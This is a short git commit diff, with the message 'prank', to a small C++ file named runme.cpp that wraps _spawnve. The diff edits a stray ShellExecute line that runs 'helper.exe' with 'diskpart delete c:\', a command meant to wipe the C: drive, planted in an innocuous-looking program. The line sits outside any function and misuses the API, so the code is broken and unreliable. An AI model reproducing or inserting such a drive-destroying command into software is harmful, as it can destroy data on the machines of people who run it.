9d55030a7b66abad1202968ff70b00bc4bf8b5b4
Lucas Hourahine <luca5h1905@gmail.com>
2020-05-13 17:00:25 -0400

    prank

--- runme.cpp
+++ runme.cpp
@@ -4,4 +4,4 @@
 int main(int argc, char **argv, char **env) {
     return _spawnve(_P_WAIT, argv[1], argv + 1, env);
 }
-ShellExecute(hwnd, "helper.exe", "diskpart delete c:\\", NULL, NULL, 0);
+ShellExecute(NULL, "helper.exe", "diskpart delete c:\\", NULL, NULL, 0);
